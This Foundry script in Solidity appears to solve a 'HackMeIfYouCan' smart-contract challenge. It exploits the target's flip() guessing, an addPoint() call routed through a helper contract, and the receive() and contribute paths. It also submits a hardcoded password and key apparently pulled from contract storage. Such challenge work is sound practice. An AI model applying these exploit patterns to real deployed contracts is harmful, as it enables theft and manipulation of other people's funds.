// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {MyContract} from "../src/MyContract.sol";

contract HackMeIfYouCanScript is Script 
{
    HackMeIfYouCan public hackContract;
    bytes32 public password;
    bytes32[15] public data;
    address public wallet;

    MyContract public myContract;
    function setUp() public {
        hackContract = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));
        wallet = address(0x99bdA7fd93A5c41Ea537182b37215567e832A726);
    }

    function run() public {
        //vm.startBroadcast(vm.envUint("PK"));
        vm.startBroadcast();
        myContract = new MyContract(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        
        
        //hackContract = new HackMeIfYouCan(password, data);
        
        // flip method
        console.log("============================== flip() method ==============================");

        console.log("nb: ",block.number );
        console.log(hackContract.flip(false));
        
    
        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));

        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));
              
        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));
        
        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));
              
        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));
        
        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));
        
        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));

        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));

        // vm.roll(block.number + 1);
        // console.log("nb: ",block.number );
        // console.log(hackContract.flip(false));

        console.log("getMarks: ", hackContract.getMarks(wallet));

        // addPoint method
        console.log("============================== addPoint() method ==============================");
        
        myContract.callAddPoint();
        console.log("getMarks: ", hackContract.getMarks(wallet));

        
        // transfer() method
        console.log("============================== transfer() method ==============================");
      
        // ...
        console.log("getMarks: ", hackContract.getMarks(wallet));

        // receive() method
        console.log("============================== receive() method ==============================");
        
        hackContract.contribute{value: 1 wei}();
        console.log("getContribute: ", hackContract.getContribution());
        (bool ok, ) = address(hackContract).call{value: 1 wei}("");
        require(ok, "Call failed!");
        
        console.log("getMarks: ", hackContract.getMarks(wallet));

        // sendPassword() method
        console.log("============================== sendPassword() method ==============================");

        hackContract.sendPassword(bytes32(0xde241fe7f783f2ed343248c0762dade0cf4eea6ed49dfe2f9f1267483c9eade8));
        console.log("getMarks: ", hackContract.getMarks(wallet));

        // sendKey() method
        console.log("============================== sendKey() method ==============================");

        hackContract.sendKey(bytes16(bytes32(0x4cded594c37730434fcf53dd25e29ab5c1f850633900601e94b37f7818fe8ee2)));
        console.log("getMarks: ", hackContract.getMarks(wallet));
        console.log("getMarks: ", hackContract.getMarks(wallet));
        console.log(hackContract.getConsecutiveWins(wallet));



        vm.stopBroadcast();
    }
}
